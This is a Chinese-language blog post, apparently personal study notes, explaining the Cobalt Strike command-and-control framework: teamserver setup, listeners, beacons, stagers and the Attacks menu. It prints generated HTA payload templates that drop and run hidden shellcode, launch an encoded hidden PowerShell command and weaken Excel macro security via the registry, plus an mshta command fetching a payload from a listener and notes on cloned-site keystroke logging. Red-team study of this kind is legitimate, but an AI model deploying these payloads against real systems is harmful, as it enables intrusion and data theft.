@@ -1,0 +1,337 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>工具使用之Cobal Strike | Khaz's Blog</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="C2是什么C2 为Command &amp; Control的简称， 即命令及控制服务器。 从语义上来讲，C2即可用作为名词（基础设施）也可以作为动词（交互的行为），例如C2服务器（名词做定语）、攻击者进行C2。 C2 通常有三个角色，客户端、被控端、服务端。客户端通过连接到服务端服务端操控受害者终端。  更多内容阅读【THM】Intro to C2(C2简介)-红队 - Hekeats - 博客">
+<meta property="og:type" content="article">
+<meta property="og:title" content="工具使用之Cobal Strike">
+<meta property="og:url" content="http://fgtbnc.github.io/2023/05/31/Cobal%20Strike%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Khaz&#39;s Blog">
+<meta property="og:description" content="C2是什么C2 为Command &amp; Control的简称， 即命令及控制服务器。 从语义上来讲，C2即可用作为名词（基础设施）也可以作为动词（交互的行为），例如C2服务器（名词做定语）、攻击者进行C2。 C2 通常有三个角色，客户端、被控端、服务端。客户端通过连接到服务端服务端操控受害者终端。  更多内容阅读【THM】Intro to C2(C2简介)-红队 - Hekeats - 博客">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-wyg7g6.jpg">
+<meta property="article:published_time" content="2023-05-31T11:52:40.000Z">
+<meta property="article:modified_time" content="2023-10-11T15:50:05.417Z">
+<meta property="article:author" content="Khaz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-wyg7g6.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/05/31/Cobal%20Strike%E4%BD%BF%E7%94%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '工具使用之Cobal Strike',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-11 23:50:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">工具使用之Cobal Strike</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-31T11:52:40.000Z" title="发表于 2023-05-31 19:52:40">2023-05-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-11T15:50:05.417Z" title="更新于 2023-10-11 23:50:05">2023-10-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="工具使用之Cobal Strike"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="C2是什么"><a href="#C2是什么" class="headerlink" title="C2是什么"></a>C2是什么</h1><p>C2 为Command &amp; Control的简称， 即命令及控制服务器。</p>
+<p>从语义上来讲，C2即可用作为名词（基础设施）也可以作为动词（交互的行为），例如C2服务器（名词做定语）、攻击者进行C2。</p>
+<p>C2 通常有三个角色，客户端、被控端、服务端。客户端通过连接到服务端服务端操控受害者终端。</p>
+<p><img src="E:/blog/source/images/3507266222.png" alt="C2 连接图.png"></p>
+<p>更多内容阅读<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17346694.html">【THM】Intro to C2(C2简介)-红队 - Hekeats - 博客园 (cnblogs.com)</a></p>
+<h1 id="Cobal-Strike是什么"><a href="#Cobal-Strike是什么" class="headerlink" title="Cobal Strike是什么"></a>Cobal Strike是什么</h1><p>CobaltStrike就是一款流行的C2框架</p>
+<p>其集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。</p>
+<p>早期版本Cobalt Srtike依赖Metasploit框架，而现在Cobalt Strike已经不再使用MSF而是作为单独的平台使用。</p>
+<p>这个工具的社区版是大家熟知的Armitage(一个MSF的图形化界面工具)，而Cobalt Strike大家可以理解其为Armitage的商业版。</p>
+<h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><ul>
+<li><p>开启服务端</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./teamserver 服务端ip 密码 [config_file]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端连接服务端</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure>
+
+<p><img src="E:\blog/source/images/image-20230701175701242.png" alt="image-20230701175701242"></p>
+</li>
+<li><p>受害机上线</p>
+<ul>
+<li><p>创建listener</p>
+<p><img src="E:\blog/source/images/image-20230701175934933.png" alt="image-20230701175934933"></p>
+<p><img src="E:\blog/source/images/image-20230701175948195.png" alt="image-20230701175948195"></p>
+<p>host和beacons设置为服务端ip地址（服务端连接目标，客户端连接到服务端）</p>
+</li>
+<li><p>创建payload&#x2F;木马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># powershell</span></span><br><span class="line">点击Attacks → Web Drive-by → Scripted Web Delivery</span><br></pre></td></tr></table></figure>
+
+<p>受害机使用powershell执行生成的payload即可上线</p>
+</li>
+</ul>
+</li>
+<li><p>上线后操作</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 学习时将心跳设为0</span></span><br><span class="line"><span class="built_in">sleep</span> 0</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h1><h2 id="菜单栏Cobal-Strike"><a href="#菜单栏Cobal-Strike" class="headerlink" title="菜单栏Cobal Strike"></a>菜单栏Cobal Strike</h2><p><img src="/../images/image-20231011221738583.png" alt="image-20231011221738583"></p>
+<p>脚本管理器→导入CS插件</p>
+<h2 id="菜单栏Views（视图）"><a href="#菜单栏Views（视图）" class="headerlink" title="菜单栏Views（视图）"></a>菜单栏Views（视图）</h2><p><img src="/../images/image-20231011220312223.png" alt="image-20231011220312223"></p>
+<h2 id="菜单栏Reporting（报告）"><a href="#菜单栏Reporting（报告）" class="headerlink" title="菜单栏Reporting（报告）"></a>菜单栏Reporting（报告）</h2><p>Cobalt Strike生成报告的目的在于培训或帮助蓝队（感觉我也可以用这个来学习手法）</p>
+<p><img src="/../images/image-20231011221035175.png" alt="image-20231011221035175"></p>
+<ul>
+<li>活动报告（Activity Report）<br>此报告中提供了红队活动的时间表，记录了每个后渗透活动。</li>
+<li>主机报告（Hosts Report）<br>此报告中汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也会在此报告中。</li>
+<li>侵害指标报告（Indicators of Compromise）<br>此报告中包括对C2拓展文件的分析、使用的域名及上传文件的MD5哈希。</li>
+<li>会话报告（Sessions Report）<br>此报告中记录了指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</li>
+<li>社工报告（Social Engineering Report）<br>此报告中记录了每一轮网络钓鱼的电子邮件、谁点击以及从每个点击用户那里收集的信息。该报告还显示了Cobalt Strike的System profiler发现的应用程序。</li>
+<li>战术、技巧和程序报告（Tactics,Techniques,and Procedures）<br>此报告将自己的Cobalt Strike行动映射到MITRE的ATT&amp;CK矩阵中的战术，具体可参考<a target="_blank" rel="noopener" href="https://attack.mitre.org/">https://attack.mitre.org/</a></li>
+</ul>
+<h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><p><img src="E:/blog/source/images/image-20231011204333463.png" alt="image-20231011204333463"></p>
+<p>服务器节点图</p>
+<p><img src="/../images/image-20231011220105230.png" alt="image-20231011220105230"></p>
+<blockquote>
+<p>每个主机的图标标识了它的操作系统。如果图标是红色的、并且带有闪电，那么表示此 Beacon 运行在管理员权限的进程中。一个褪色的图标说明此 Beacon 会话被要求离开并且它接受了此 命令。 防火墙图标代表你 Beacon payload 的流量出口点。绿色虚线表示使用了 HTTP 或 HTTPS 连接出网。 黄色虚线表示使用 DNS 协议出网。</p>
+<p>从一个 Beacon 会话连接到另一个 Beacon 会话的箭头表示两个 Beacon 之间存在连接。在这种对等通 信模式中，Cobalt Strike 的 Beacon 使用 Windows 命名管道和 TCP sockets 来控制其他的Beacon。 橙黄色的箭头代表命名管道通道。SSH 会话也使用一个橙黄色的箭头。一个湖蓝色的箭头代表一个 TCP socket 通道。一个红色的（命名管道）或紫色的（TCP）箭头表示一个 Beacon 连接断掉了。</p>
+</blockquote>
+<h1 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h1><p><strong>为什么要搭建基础设施</strong></p>
+<blockquote>
+<p>隐蔽</p>
+</blockquote>
+<h2 id="监听器Listeners"><a href="#监听器Listeners" class="headerlink" title="监听器Listeners"></a>监听器Listeners</h2><p><strong>什么是监听器</strong></p>
+<p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p>
+<p><strong>监听器的作用</strong></p>
+<p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p>
+<p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p>
+<p><strong>监听器的名字一般由以下结构组成：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Operating System/Payload/Stager</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>什么是传输器</strong></p>
+<p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p>
+<p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p>
+<p>我个人理解为：攻击载荷里真正用于攻击的代码是在传输体里。</p>
+<p>所以为什么要有传输体？直接把攻击载荷插入到内存中不更方便快捷、更香么，搞得又是传输器又是传输体的。</p>
+<p>需要传输体是因为在很多攻击中对于能加载进内存，并在成功漏洞利用后执行的数据大小存在严格限制。这就导致在攻击成功时，很难嵌入额外的攻击载荷，正是因为这些限制，才使得传输器变得有必要了。</p>
+<p><strong>创建监听器</strong></p>
+<p><img src="E:/blog/source/images/image-20231011211109107.png" alt="image-20231011211109107"></p>
+<ul>
+<li><p>Name 是对 Listener 备注名称</p>
+</li>
+<li><p>Payload中可以选择监听器的类型和使用的协议</p>
+<ul>
+<li><p>Beacon</p>
+<p>Beacon直译过来就是灯塔、信标、照亮指引的意思</p>
+<p>Beacon监听器的名称<code>windows/beacon_http/reverse_http</code>→ <code>System/Payload/Stager</code></p>
+</li>
+<li><p>Foreign</p>
+<p>Foreign直译就是外部的，这里可以理解成<code>对外监听器</code>，主要用于派生会话，如将会话派生到MSF中</p>
+</li>
+</ul>
+</li>
+<li><p>HTTP Hosts 是 Beacon 回连地址</p>
+</li>
+<li><p>HTTP Port (C2) 是回连地址端口号</p>
+</li>
+<li><p>HTTP Host (Stager) 是下载 Staged 剩余 Payload 主机地址。</p>
+</li>
+</ul>
+<h2 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h2><h3 id="Beacon是什么"><a href="#Beacon是什么" class="headerlink" title="Beacon是什么"></a><strong>Beacon是什么</strong></h3><ul>
+<li><p>Beacon(信标)是指C2代理回调在C2服务器上运行的侦听器的过程，它是一种恶意软件与C2(命令与控制)服务器之间的定期通信方式(通信机制)。</p>
+</li>
+<li><p>Beacon有两种通信模式。</p>
+<p>一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；</p>
+<blockquote>
+<p>为了避免频繁通信暴露目标，每个 Beacon 默认 sleep 是 60 秒与服务器通讯一次，可以通过命令 sleep 或者右键 Becaon，找到 <code>Session -&gt; Sleep</code> 设置 TeamServer 与 Beacon 通信时间。</p>
+</blockquote>
+<p>另一种是交互式通信模式，这种模式的通信是实时发生的。</p>
+<blockquote>
+<p>将sleep设置为0</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Beacon的类型–待学习"><a href="#Beacon的类型–待学习" class="headerlink" title="Beacon的类型–待学习"></a><strong>Beacon的类型</strong>–待学习</h3><ul>
+<li>Beacon DNS</li>
+<li>Beacon HTTP</li>
+<li>Beacon HTTPS</li>
+<li>Beacon SMB</li>
+<li>Beacon TCP</li>
+<li>Extermal C2</li>
+</ul>
+<h1 id="Attacks（攻击）"><a href="#Attacks（攻击）" class="headerlink" title="Attacks（攻击）"></a>Attacks（攻击）</h1><h2 id="Packages（生成木马）"><a href="#Packages（生成木马）" class="headerlink" title="Packages（生成木马）"></a>Packages（生成木马）</h2><h3 id="HTML-Application-Attack（HTA-Attack）"><a href="#HTML-Application-Attack（HTA-Attack）" class="headerlink" title="HTML Application Attack（HTA Attack）"></a>HTML Application Attack（HTA Attack）</h3><blockquote>
+<p>HTA文件是一种称为HTML应用程序的文件格式，它是基于 HTML、CSS、VBScript的技术。</p>
+<p>HTA文件可以在Windows操作系统上运行，通过双击HTA文件或使用命令行运行mshta.exe来启动。</p>
+<p>其中HTML 和 CSS 控制样式，而VBScript可以用来执行系统命令。</p>
+</blockquote>
+<p><strong>Demo代码</strong></p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;tetsa&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            h1 &#123;</span><br><span class="line">                color: red;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello&lt;/h1&gt;</span><br><span class="line">        &lt;a href=#&gt;test link&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script language=<span class="string">&quot;VBScript&quot;</span>&gt;</span><br><span class="line">            <span class="built_in">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>).Run(<span class="string">&quot;calc&quot;</span>)</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>双击打开就会执行vbs代码，从而弹出计算器</p>
+<p><img src="/../images/image-20231011223006570.png" alt="image-20231011223006570"></p>
+<p>HTML Application 菜单有三个方法：</p>
+<p><img src="/../images/image-20231011222135501.png" alt="image-20231011222135501"></p>
+<ul>
+<li>Executable</li>
+<li>PowerShell</li>
+<li>VBA</li>
+</ul>
+<p>Executable 生成内容是 VBScript 脚本，使用 Wscript.Shell 运行代码。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span></span><br><span class="line">    Function var_func()</span><br><span class="line">        var_shellcode = &quot;4d5a90000300000004000000ffff0000b8000......&quot;</span><br><span class="line"></span><br><span class="line">        Dim var_obj</span><br><span class="line">        Set var_obj = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">        Dim var_stream</span><br><span class="line">        Dim var_tempdir</span><br><span class="line">        Dim var_tempexe</span><br><span class="line">        Dim var_basedir</span><br><span class="line">        Set var_tempdir = var_obj.GetSpecialFolder(2)</span><br><span class="line">        var_basedir = var_tempdir &amp; &quot;\&quot; &amp; var_obj.GetTempName()</span><br><span class="line">        var_obj.CreateFolder(var_basedir)</span><br><span class="line">        var_tempexe = var_basedir &amp; &quot;\&quot; &amp; &quot;evil.exe&quot;</span><br><span class="line">        Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)</span><br><span class="line">        For i = 1 to Len(var_shellcode) Step 2</span><br><span class="line">            var_stream.Write Chr(CLng(&quot;&amp;H&quot; &amp; Mid(var_shellcode,i,2)))</span><br><span class="line">        Next</span><br><span class="line">        var_stream.Close</span><br><span class="line">        Dim var_shell</span><br><span class="line">        Set var_shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">        var_shell.run var_tempexe, 0, true</span><br><span class="line">        var_obj.DeleteFile(var_tempexe)</span><br><span class="line">        var_obj.DeleteFolder(var_basedir)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    var_func</span><br><span class="line">    self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PowerShell 也是 VBScript 脚本不过 Wscript.Shell 运行的是 PowerShell 程序，其执行的内容经过 Base64 编码。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;VBScript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Function</span> <span class="title function_">var_func</span>()</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Dim</span> var_shell</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Set</span> var_shell = <span class="title class_">CreateObject</span>(<span class="string">&quot;Wscript.Shell&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">        var_shell.<span class="property">run</span> <span class="string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAG......MAdAAgAEkAoACkAOwA=&quot;</span>, <span class="number">0</span>, <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">End</span> <span class="title class_">Function</span></span></span><br><span class="line"><span class="language-javascript">    var_func</span></span><br><span class="line"><span class="language-javascript">    self.<span class="property">close</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>VBS 将执行 Excel 宏上线。过程是修改注册表信任 Excel 宏，并执行宏，最后恢复注册表。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line">Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule</span><br><span class="line"></span><br><span class="line">Set objExcel = CreateObject(&quot;Excel.Application&quot;)</span><br><span class="line">objExcel.Visible = False</span><br><span class="line"></span><br><span class="line">Set WshShell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line"></span><br><span class="line">function RegExists(regKey)</span><br><span class="line">    on error resume next</span><br><span class="line">    WshShell.RegRead regKey</span><br><span class="line">    RegExists = (Err.number = 0)</span><br><span class="line">end function</span><br><span class="line"></span><br><span class="line">&#x27; Get the old AccessVBOM value</span><br><span class="line">RegPath = &quot;HKEY_CURRENT_USER\Software\Microsoft\Office\&quot; &amp; objExcel.Version &amp; &quot;\Excel\Security\AccessVBOM&quot;</span><br><span class="line"></span><br><span class="line">if RegExists(RegPath) then</span><br><span class="line">    action = WshShell.RegRead(RegPath)</span><br><span class="line">else</span><br><span class="line">    action = &quot;&quot;</span><br><span class="line">end if</span><br><span class="line"></span><br><span class="line">&#x27; Weaken the target</span><br><span class="line">WshShell.RegWrite RegPath, 1, &quot;REG_DWORD&quot;</span><br><span class="line"></span><br><span class="line">&#x27; Run the macro</span><br><span class="line">Set objWorkbook = objExcel.Workbooks.Add()</span><br><span class="line">Set xlmodule = objWorkbook.VBProject.VBComponents.Add(1)</span><br><span class="line">xlmodule.CodeModule.AddFromString &quot;Private &quot;......&quot;</span><br><span class="line">objExcel.DisplayAlerts = False</span><br><span class="line">on error resume next</span><br><span class="line">objExcel.Run &quot;Auto_Open&quot;</span><br><span class="line">objWorkbook.Close False</span><br><span class="line">objExcel.Quit</span><br><span class="line"></span><br><span class="line">&#x27; Restore the registry to its old state</span><br><span class="line">if action = &quot;&quot; then</span><br><span class="line">    WshShell.RegDelete RegPath</span><br><span class="line">else</span><br><span class="line">    WshShell.RegWrite RegPath, action, &quot;REG_DWORD&quot;</span><br><span class="line">end if</span><br><span class="line">self.close</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行上线很简单，使用 mshta 执行 .hta 文件即可。</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">0</span>.<span class="number">102</span>:<span class="number">80</span>/download/file.ext</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="MS-Office-Macro–待学习"><a href="#MS-Office-Macro–待学习" class="headerlink" title="MS Office Macro–待学习"></a>MS Office Macro–待学习</h3><p>微软 Office Word，Excel，PowerPoint 常说宏都是用 VBA（Visual Basic for Application）编写的，这个宏的作用是可以访问部分 Windows API 模拟键盘、鼠标等操作。</p>
+<h3 id="Payload-Gennerator"><a href="#Payload-Gennerator" class="headerlink" title="Payload Gennerator"></a>Payload Gennerator</h3><p>生成原始 Payload用来当作免杀的原材料。</p>
+<h3 id="Windows-Executable-x2F-Executable-S"><a href="#Windows-Executable-x2F-Executable-S" class="headerlink" title="Windows Executable&#x2F;Executable (S)"></a>Windows Executable&#x2F;Executable (S)</h3><h2 id="Web-Drive-by（钓鱼攻击）"><a href="#Web-Drive-by（钓鱼攻击）" class="headerlink" title="Web Drive-by（钓鱼攻击）"></a>Web Drive-by（钓鱼攻击）</h2><h3 id="System-Profier"><a href="#System-Profier" class="headerlink" title="System Profier"></a>System Profier</h3><p>系统侦察<code>System Profiler</code>是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p>
+<p><img src="/../images/image-20231011233039941.png" alt="image-20231011233039941"></p>
+<p>访问server的<code>/baidu</code>会重定向到百度，获得到的指纹可以在以下查看</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231011233209117.png" alt="image-20231011233209117"></p>
+<p>值得注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p>
+<h3 id="Clone-site（克隆网站）"><a href="#Clone-site（克隆网站）" class="headerlink" title="Clone site（克隆网站）"></a>Clone site（克隆网站）</h3><p><img src="/../images/image-20231011234547914.png" alt="image-20231011234547914"></p>
+<ul>
+<li>Log keystrokes on cloned site：获取目标的键盘记录，在WebLog中可以查看</li>
+</ul>
